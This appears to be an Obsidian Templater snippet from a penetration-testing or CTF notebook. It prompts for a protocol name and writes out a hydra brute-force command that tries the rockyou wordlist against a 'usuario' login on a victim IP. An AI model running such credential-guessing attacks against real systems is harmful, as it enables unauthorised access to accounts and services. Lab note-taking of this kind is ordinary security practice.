<%*
let Protocol = await tp.system.prompt("Enter the name of the protocol")
-%>

- We launch hydra against the protocol <% Protocol %>: 

```
hydra -l usuario -P /usr/share/wordlists/rockyou.txt <% Protocol %>://<% tp.frontmatter["VictimIP"] %>
```